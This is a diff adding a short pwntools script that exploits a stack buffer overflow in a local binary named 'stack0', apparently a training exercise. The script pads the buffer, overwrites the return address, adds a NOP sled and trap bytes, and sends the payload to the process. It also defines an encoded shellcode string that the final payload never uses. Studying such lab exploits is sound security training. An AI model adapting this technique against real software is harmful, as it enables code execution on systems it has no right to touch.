@@ -1,0 +1,23 @@
+from pwn import *
+
+context.binary = binary = ELF('./stack0')
+
+padding = b'A'*0x4C
+
+sc = b"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"
+
+eip = p32(0x08048529)
+
+nopsled = b'\x90'*10
+
+trap = b'\xCC'*4
+
+final = padding + eip + nopsled + trap
+
+with open('exp', 'wb') as f:
+    f.write(final)
+
+p = process()
+p.sendline(final)
+p.interactive()
+
